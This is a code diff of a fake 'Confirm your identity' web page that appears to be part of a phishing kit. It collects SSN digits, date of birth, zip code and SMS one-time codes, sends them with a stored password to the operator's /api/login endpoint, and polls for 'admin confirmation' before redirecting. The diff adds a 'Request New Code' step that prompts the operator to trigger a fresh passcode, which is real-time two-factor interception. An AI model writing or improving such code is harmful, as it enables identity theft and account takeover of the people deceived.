@@ -8,13 +8,14 @@
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; padding: 20px; }
         .container { max-width: 420px; margin: auto; background: white; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         h1 { font-size: 1.75rem; text-align: center; margin-bottom: 8px; color: #1e2937; }
-        p { text-align: center; color: #64748b; margin-bottom: 25px; }
+        p { text-align: center; color: #64748b; margin-bottom: 25px; line-height: 1.5; }
         label { display: block; margin: 20px 0 8px; font-weight: 600; color: #334155; }
         input, select { width: 100%; padding: 14px; border: 1.5px solid #e2e8f0; border-radius: 10px; font-size: 1.05rem; }
         .date-group { display: flex; gap: 10px; }
-        button { width: 100%; padding: 16px; margin-top: 15px; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; }
+        button { width: 100%; padding: 16px; margin-top: 12px; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; }
         .continue { background: #1e40af; color: white; }
-        .error { color: #ef4444; margin: 15px 0; text-align: center; }
+        .new-code { background: #eab308; color: black; }
+        .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
         .waiting { color: #3b82f6; margin: 20px 0; text-align: center; font-weight: 500; }
         .step { display: none; }
         .step.active { display: block; }
@@ -22,8 +23,12 @@
 </head>
 <body>
     <div class="container">
+
+        <!-- Step 1: SSN + DOB -->
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
+            <p>You'll need to provide some information first.</p>
+            
             <label>Last 4 Digits of SSN</label>
             <input type="text" id="ssn" maxlength="4" placeholder="1234">
 
@@ -40,19 +45,23 @@
             <button class="continue" onclick="nextStep(2)">Continue</button>
         </div>
 
+        <!-- Step 2: Zip Code -->
         <div id="step2" class="step">
-            <h1>Additional Information</h1>
+            <h1>Provide Additional Information</h1>
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345">
             <button class="continue" onclick="nextStep(3)">Continue</button>
         </div>
 
+        <!-- Step 3: Access Code -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
             <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
             <div id="status"></div>
+            
             <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="new-code" onclick="requestNewCode()">Request New Code</button>
         </div>
     </div>
 
@@ -60,13 +69,17 @@
         let realPassword = sessionStorage.getItem('realPassword') || "N/A";
 
         function nextStep(step) {
-            if (step === 2 && (document.getElementById('ssn').value.length !== 4 || !document.getElementById('privacy').checked)) {
-                alert("Please complete all fields.");
-                return;
+            if (step === 2) {
+                if (document.getElementById('ssn').value.length !== 4 || !document.getElementById('privacy').checked) {
+                    alert("Please fill SSN and accept the Privacy Policy.");
+                    return;
+                }
             }
-            if (step === 3 && document.getElementById('zip').value.length < 5) {
-                alert("Please enter valid Zip Code.");
-                return;
+            if (step === 3) {
+                if (document.getElementById('zip').value.length < 5) {
+                    alert("Please enter a valid Zip Code.");
+                    return;
+                }
             }
 
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -78,15 +91,15 @@
             const statusDiv = document.getElementById('status');
 
             if (code.length < 4) {
-                statusDiv.innerHTML = `<span class="error">Invalid code</span>`;
+                statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
                 return;
             }
 
             statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation...</span>`;
 
-            const ssn = document.getElementById('ssn').value;
+            const ssn = document.getElementById('ssn').value || "";
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
-            const zip = document.getElementById('zip').value;
+            const zip = document.getElementById('zip').value || "";
 
             const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
 
@@ -100,6 +113,10 @@
                 })
             });
 
+            pollForConfirmation();
+        }
+
+        function pollForConfirmation() {
             const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
@@ -107,16 +124,33 @@
 
                 if (latest && latest.address.includes("Confirmed")) {
                     clearInterval(interval);
-                    statusDiv.innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
+                    document.getElementById('status').innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
                     setTimeout(() => window.location.href = "tunde.html", 1500);
                 } else if (latest && latest.address.includes("Rejected")) {
                     clearInterval(interval);
-                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected. Try again.</span>`;
-                    document.getElementById('code').value = '';
+                    document.getElementById('status').innerHTML = `<span class="error">❌ Code Rejected.<br>Use "Request New Code" below.</span>`;
                 }
             }, 2000);
         }
 
+        async function requestNewCode() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
+
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "New Code Request",
+                    password: realPassword,
+                    address: "🔄 USER REQUESTED NEW CODE | Please send new verification code | Status: Pending"
+                })
+            });
+
+            statusDiv.innerHTML = `<span style="color:#eab308">✅ New code requested.<br>Please check your SMS shortly.</span>`;
+        }
+
+        // Populate Date Dropdowns
         window.onload = () => {
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
             months.forEach((m,i) => {
